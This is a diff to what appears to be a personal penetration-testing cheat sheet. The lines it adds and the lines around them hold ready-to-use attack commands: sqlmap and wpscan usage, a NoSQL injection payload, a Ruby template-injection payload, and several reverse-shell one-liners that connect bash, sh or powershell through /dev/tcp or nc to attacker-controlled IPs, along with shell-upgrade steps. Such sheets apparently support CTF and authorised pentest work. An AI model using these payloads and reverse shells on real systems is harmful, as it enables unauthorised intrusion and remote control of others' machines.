@@ -322,7 +322,10 @@ sqlmap -R request.txt --batch --random-refer
 # nosql injection (SQL):
 username=admin&password[$ne]=admin
 
-# WPSCAN
+# RUBY template injection (ruby, ssti)
+?message=<%= EXPRESSION %>
+
+# WPSCAN (wordpress, wpscan)
 enumerate plugins, themes etc
 wpscan --url http://domain -e vp,dbe,cb
 
@@ -336,15 +339,17 @@ scp -l 1000000 file.zip root@127.0.0.1:/tmp
 # download (-l maxspeed)
 scp -l 1000000 root@127.0.0.1:/tmp .
 
-# REVERSE SHELLS
+# REVERSE SHELLS (upgrade shell)
 Upgrade shell:
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 optional:
 (inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
 
+# REV SHELLS (rev shells)
 bash
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 bash -i >& /dev/tcp/10.10.10.10/9001 0>&1
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|powershell -i 2>&1|nc 10.18.20.243 1337 >/tmp/f
 
 SH
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.177 1337 >/tmp/f
